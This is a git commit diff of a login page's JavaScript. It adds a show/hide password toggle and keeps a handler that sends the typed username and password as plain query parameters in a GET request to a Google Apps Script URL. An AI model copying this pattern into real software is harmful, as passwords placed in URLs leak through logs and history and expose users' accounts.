d108555bdd846eb774fab6ef296cb8ecb61b68c8
Luu Van Dung <42308652+vandung2kk2@users.noreply.github.com>
2021-02-01 11:53:15 +0700

    Add files via upload

--- script.js
+++ script.js
@@ -1,30 +1,37 @@
-var inp = document.getElementsByClassName("inp");
-var username = document.getElementById("username");
-var password = document.getElementById("password");
-for(let i=0;i<inp.length;i++){
-	inp[i].addEventListener("keyup",function(){
-		if(this.value != ""){
-			this.nextElementSibling.classList.add("activeInp");
+window.onload=function(){
+	var login = document.getElementById("login"),
+		user = document.getElementById("username"),
+		pass = document.getElementById("password");
+	var inp = document.getElementsByClassName("inp");
+	for(let i=0; i<2;i++){
+		inp[i].addEventListener("input", function(){
+			console.log(this);
+			if(this.value != ""){
+				this.classList.add("active")
+			}else this.classList.remove("active");
+		})
+	}
+	var show = document.getElementById("show");
+	show.onclick = function(){
+		if(pass.getAttribute("type") == "password"){
+			pass.setAttribute("type","text");
+			this.innerText = "Hide";
+			pass.setAttribute("autofocus",true);
 		}else{
-			this.nextElementSibling.classList.remove("activeInp");
-		}
-	})
-}
-
-var url = "https://script.google.com/macros/s/AKfycbzz3LNrwY2k2WKzDOsUizxiWFC_B21T4Pc2lpFdNB3glMsoKkvEOUPy/exec";
-var submit = document.getElementById("login-btn");
-submit.addEventListener("click",function(){
-	let request = new XMLHttpRequest();
-	request.open("GET",url + "?username=" + username.value + "&password=" + password.value);
-	request.onreadystatechange = function(){
-		if(this.readyState == 4){
-			alert(this.responseText)
+			pass.setAttribute("type","password");
+			this.innerText = "Show";
+			pass.setAttribute("autofocus",true);
 		}
 	}
-	request.send()
-})
-/*if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
-  document.write("mobile");
-}else{
-  document.write("not mobile");
-}*/
+	var url = "https://script.google.com/macros/s/AKfycbzz3LNrwY2k2WKzDOsUizxiWFC_B21T4Pc2lpFdNB3glMsoKkvEOUPy/exec";
+	login.addEventListener("click",function(){
+		let request = new XMLHttpRequest();
+		request.open("GET",url + "?username=" + username.value + "&password=" + password.value);
+		request.onreadystatechange = function(){
+			if(this.readyState == 4){
+				alert(this.responseText)
+			}
+		}
+		request.send()
+	})
+}
